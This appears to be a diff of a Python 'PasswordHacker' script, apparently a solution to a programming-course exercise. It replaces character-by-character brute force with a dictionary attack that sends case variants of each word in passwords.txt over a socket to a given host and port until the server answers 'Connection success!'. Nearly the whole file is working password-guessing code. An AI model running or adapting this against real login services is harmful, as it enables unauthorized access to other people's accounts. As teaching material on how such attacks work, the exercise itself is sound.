@@ -1,59 +1,87 @@
 # write your code here
-import sys
+
 import socket
-import string
 import itertools
+import argparse
+
+
+class SocketClient:
+    RECV_NUM = 1024
+
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.socket = None
+
+    def connect(self):
+        if self.socket is None:
+            self.socket = socket.socket()
+        self.socket.connect((self.host, self.port))
+
+    def disconnect(self):
+        self.socket.close()
+        self.socket = None
+
+    def send_data(self, data):
+        if self.socket is None:
+            self.connect()
+        self.socket.send(data.encode())
+
+    def recv_data(self):
+        if self.socket is None:
+            self.connect()
+        return self.socket.recv(SocketClient.RECV_NUM).decode()
 
 
 class PasswordHacker:
-    COUNT = 10
-
-    def __init__(self):
-        self.ip_address = ''
-        self.port = 0
-        self.send_message = ''
-        self.args_value = []
+    def __init__(self, conn):
+        self.conn = conn
         self.char_num = []
+        self.data = []
 
-    def args_module(self):
-        args = sys.argv
+    @staticmethod
+    def mutate_word(data):
+        lower_w = data.lower()
+        upper_w = data.upper()
+        return [''.join(i) for i in itertools.product(*zip(lower_w,  upper_w))]
 
-        try:
-            if len(args) != 3:
-                print('The script should be called with three arguments')
-            else:
-                host = str(args[1])
-                port = int(args[2])
-                # passwd = str(args[3])
-                self.args_value = [host, port]
-        except IndexError:
-            print('The script should be called with three arguments')
+    def save_data(self):
+        with open('passwords.txt', 'r') as word_password:
+            self.data = [line.rstrip('\n') for line in word_password]
 
-    def string_num(self):
-        self.char_num = list(string.ascii_lowercase + string.digits)
+    def based_password(self):
+        self.save_data()
 
-    def create_socket(self):
-        self.args_module()
-        self.string_num()
+        for pwd in self.data:
+            for wrd in self.mutate_word(pwd):
+                self.conn.send_data(wrd)
+                resp = self.conn.recv_data()
 
-        with socket.socket() as client_socket:
-            hostname = self.args_value[0]
-            port = self.args_value[1]
-
-            try:
-                client_socket.connect((hostname, port))
-
-                for i in range(1, PasswordHacker.COUNT):
-                    for passwd in itertools.product(self.char_num, repeat=i):
-                        client_socket.send(''.join(passwd).encode())
-                        response = client_socket.recv(1024)
-
-                        if response.decode() == 'Connection success!':
-                            print(''.join(passwd))
-                            exit()
-            except ConnectionRefusedError:
-                print(response.decode())
+                if 'Wrong password!' in resp:
+                    continue
+                if 'Connection success!' in resp:
+                    print(wrd)
+                    exit()
+                elif 'Too many attempts' in resp:
+                    print('Too many attempts')
+                    exit()
 
 
-password_hacker = PasswordHacker()
-password_hacker.create_socket()
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('hostname', default='127.0.0.1', help='host name or IP address')
+    parser.add_argument('port', type=int)
+    args_name = parser.parse_args()
+
+    conn = SocketClient(host=args_name.hostname, port=args_name.port)
+
+    try:
+        conn.connect()
+        PasswordHacker(conn).based_password()
+        conn.disconnect()
+    except ConnectionRefusedError:
+        print('No connect!')
+
+
+if __name__ == '__main__':
+    main()
